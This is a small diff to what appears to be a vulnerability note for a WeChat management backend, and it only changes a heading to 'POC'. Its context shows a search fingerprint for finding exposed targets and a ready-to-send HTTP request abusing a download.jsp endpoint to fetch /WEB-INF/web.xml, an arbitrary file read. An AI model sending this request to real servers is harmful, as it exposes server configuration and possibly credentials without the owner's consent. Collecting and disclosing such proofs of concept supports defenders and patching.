@@ -8,7 +8,7 @@
 title=="微信管理后台"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /mobile/pages/admin/tools/file/download.jsp?items=/WEB-INF/web.xml HTTP/1.1
